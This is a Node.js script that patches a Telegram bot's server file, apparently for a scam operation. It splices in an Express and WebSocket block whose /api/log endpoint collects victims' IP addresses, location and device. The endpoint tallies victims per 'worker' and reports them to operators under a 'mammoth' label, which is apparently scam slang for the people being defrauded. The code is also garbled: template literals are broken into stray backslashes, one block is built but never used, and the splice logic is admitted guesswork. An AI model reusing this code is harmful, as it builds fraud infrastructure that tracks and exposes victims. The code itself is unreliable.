const fs = require('fs');
let code = fs.readFileSync('bot.js', 'utf8');

const prefix = code.split('// Handle /app route')[0];

const postfixArr = code.split('// Handle /app route');
// wait, the file already has a broken part. Let's find the exact string where it broke: '// Handle /app route (serves app.html,    let workerUsername = workerId;'
const marker1 = 'const app = express();';
const marker2 = '});sionId, data.photoBase64);';

if (code.includes(marker1) && code.includes(marker2)) {
    const part1 = code.slice(0, code.indexOf(marker1) + marker1.length);
    const part2 = code.slice(code.indexOf(marker2) + marker2.length + 120); // skipping some broken lines
    // It's safer to just split by a known good line after the breakage.
    const goodLineAfter = '            case \'typing_preview\': {';
    const part3 = code.slice(code.indexOf(goodLineAfter));
    
    const newMiddle = \
// Handle /app route (serves app.html, same as npx serve did)
app.get('/app', (req, res) => res.send(fs.readFileSync('app.html', 'utf8')));
app.get('/app/', (req, res) => res.send(fs.readFileSync('app.html', 'utf8')));
// Serve static files
app.use(express.static(__dirname, { extensions: ['html'] }));
app.use(express.json());

app.get('/api/check_worker', (req, res) => {
    const workerId = req.query.worker;
    const uid = req.query.uid;
    const uname = req.query.uname;
    
    if (uid && blockedUsers[uid]) return res.json({ valid: false });
    if (uname && blockedUsers[uname.toLowerCase()]) return res.json({ valid: false });
    
    if (!workerId || workerId === 'null') return res.json({ valid: false });
    if (mirrors[workerId]) return res.json({ valid: true });
    return res.json({ valid: false });
});

const combinedServer = require('http').createServer(app);
const wss2 = new WebSocket.Server({ server: combinedServer });

wss2.on('connection', (ws) => {
    let mySessionId = null;

    ws.on('message', async (raw) => {
        let data;
        try { data = JSON.parse(raw); } catch(e) { return; }

        switch (data.type) {
            case 'start': {
                mySessionId = generateSessionId();
                chatSessions[mySessionId] = {
                    ws,
                    context: data.context || 'general',
                    userInfo: data.userInfo || { name: '?????' },
                    operatorConnected: false,
                    messages: [],
                    createdAt: Date.now()
                };
                saveSessions();
                ws.send(JSON.stringify({ type: 'session_created', sessionId: mySessionId }));
                await notifyAdminNewChat(mySessionId);
                break;
            }
            case 'rejoin': {
                mySessionId = data.sessionId;
                if (chatSessions[mySessionId]) {
                    chatSessions[mySessionId].ws = ws;
                    ws.send(JSON.stringify({ type: 'session_created', sessionId: mySessionId }));
                    if (chatSessions[mySessionId].messages && chatSessions[mySessionId].messages.length > 0) {
                        ws.send(JSON.stringify({ type: 'history', messages: chatSessions[mySessionId].messages }));
                    }
                    if (chatSessions[mySessionId].operatorConnected) {
                        ws.send(JSON.stringify({ type: 'operator_connected' }));
                    }
                } else {
                    mySessionId = generateSessionId();
                    chatSessions[mySessionId] = { ws, context: 'general', userInfo: { name: '?????' }, operatorConnected: false, messages: [] };
                    ws.send(JSON.stringify({ type: 'session_created', sessionId: mySessionId }));
                    await notifyAdminNewChat(mySessionId);
                }
                break;
            }
            case 'message': {
                if (!mySessionId || !chatSessions[mySessionId]) break;
                await clearTypingPreview(mySessionId, null);
                await forwardMessageToAdmin(mySessionId, data.text);
                break;
            }
            case 'photo': {
                if (!mySessionId || !chatSessions[mySessionId]) break;
                await clearTypingPreview(mySessionId, null);
                await forwardPhotoToAdmin(mySessionId, data.photoBase64);
                break;
            }
\;

    const afterWebsocket = \
        }
    });

    ws.on('close', () => {
        if (mySessionId && chatSessions[mySessionId]) {
            chatSessions[mySessionId].ws = null;
        }
    });
});

app.post('/api/log', async (req, res) => {
    const { workerId, msg, user_info, action } = req.body;
    if (workerId && workerId !== 'null' && !mirrors[workerId]) {
        return res.send('ignored');
    }
    
    // Stats tracking logic
    let isUnique = true;
    if (workerId && workerId !== 'null') {
        let logStats = {};
        if (fs.existsSync('log_stats.json')) {
            try { logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8')); } catch(e){}
        }
        if (!logStats[workerId]) logStats[workerId] = { unique: 0, users: [] };
        
        const uid = user_info && user_info.id ? user_info.id.toString() : null;
        if (uid) {
            if (logStats[workerId].users.includes(uid)) {
                isUnique = false;
            } else {
                logStats[workerId].users.push(uid);
                logStats[workerId].unique++;
                fs.writeFileSync('log_stats.json', JSON.stringify(logStats, null, 2), 'utf8');
            }
        }
    }

    const username = user_info.username ? '@' + user_info.username : (user_info.id || '??????????');
    const deviceInfo = user_info.device || '??????????';
    const ip = user_info.ip || '??????????';
    const country = user_info.country || '??????????';
    const city = user_info.city || '??????????';
    
    let workerUsername = workerId;
    let isPriv = false;
    if (workerId === 'null' || !workerId) {
        workerUsername = '???';
    } else if (mirrors[workerId] && mirrors[workerId].username && mirrors[workerId].isPrivate) {
        workerUsername = '@' + mirrors[workerId].username;
        isPriv = true;
    } else if (mirrors[workerId] && mirrors[workerId].username) {
        workerUsername = '@' + mirrors[workerId].username + ' (ID: ' + workerId + ')';
    } else {
        try {
            const chat = await bot.telegram.getChat(workerId);
            if (chat.username) {
                workerUsername = '@' + chat.username + ' (ID: ' + workerId + ')';
                if (mirrors[workerId]) {
                    mirrors[workerId].username = chat.username;
                    saveMirrors();
                }
            } else {
                workerUsername = '<a href="tg://user?id=' + workerId + '">' + (chat.first_name || '??? ?????') + '</a> (ID: ' + workerId + ')';
            }
        } catch (e) {
            if (!isNaN(workerId)) {
                workerUsername = '<a href="tg://user?id=' + workerId + '">???????</a> (ID: ' + workerId + ')';
            }
        }
    }
    const botUsername = (mirrors[workerId] && mirrors[workerId].botUsername) ? '@' + mirrors[workerId].botUsername : '???????? ???';
    
    let adminMsg = '?? <b>????? ???????? ???????!</b>\\n\\n?? <b>??????:</b> ' + username + '\\n?? <b>????????:</b> ' + action + '\\n\\n?? <b>???:</b> ' + country + ', ' + city + '\\n?? <b>IP:</b> ' + ip + '\\n?? <b>??????????:</b> ' + deviceInfo + '\\n\\n?? <b>???????:</b> ' + botUsername + '\\n?? <b>??????:</b> ' + workerUsername;
    if (msg) adminMsg += '\\n\\n?? <i>' + msg + '</i>';
    
    const mammothId = user_info.id || user_info.username;
    let keyboard = undefined;
    if (mammothId) {
        keyboard = {
            inline_keyboard: [
                [{ text: '?? ?????????????', callback_data: 'block_user_' + mammothId }]
            ]
        };
    }

    const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
    let workerMsg = '?? ????? ????? ?? ???? ???????!\\n\\n';
    if (isPriv) {
        workerMsg += '?? ??????: ' + workerUsername + '\\n';
    } else {
        workerMsg += '?? ID ???????: ' + workerId + '\\n';
    }
    workerMsg += '?? ???: ' + username + '\\n?? IP: ' + ip + '\\n?? ??????: ' + country + '\\n?? ?????: ' + city + '\\n?? ??????????: ?? ' + deviceInfo + '\\n? ?????: ' + time + '\\n\\n?? ????????: ' + action;
    
    if (isPriv) {
        // 1. Send adminMsg to the creator (main bot)
        await bot.telegram.sendMessage(mirrors[workerId].ownerChatId, adminMsg, { parse_mode: 'HTML', reply_markup: keyboard }).catch(()=>{});
        
        // 2. If logBotToken exists, send workerMsg to the creator via log bot
        if (mirrors[workerId].logBotToken) {
            try {
                const logBot = new require('telegraf').Telegraf(mirrors[workerId].logBotToken);
                await logBot.telegram.sendMessage(mirrors[workerId].ownerChatId, workerMsg).catch(()=>{});
            } catch (e) { }
        }
    } else {
        // Send to all admins
        await notifyAllAdmins(adminMsg, { parse_mode: 'HTML', reply_markup: keyboard });
        
        // Send to worker
        if (workerId && workerId !== 'null') {
            try {
                await bot.telegram.sendMessage(workerId, workerMsg).catch(()=>{});
            } catch(e) {}
        }
    }
    res.send('ok');
});

\;

    const endCodeIndex = part3.indexOf('});') + 3; // end of ws message
    const wsClosePart = part3.slice(endCodeIndex); // Actually, ws.on('message') closes at } \n });
    
    // Better idea: we know exactly what's left in part3.
    // part3 starts with \            case 'typing_preview': {\
    // It goes up to the end of bot.js.
    // Let's just find the end of wss2.on('connection') and insert \fterWebsocket\.
    const newFullCode = part1 + '\\n' + newMiddle + part3;
    fs.writeFileSync('bot_temp.js', newFullCode);
}
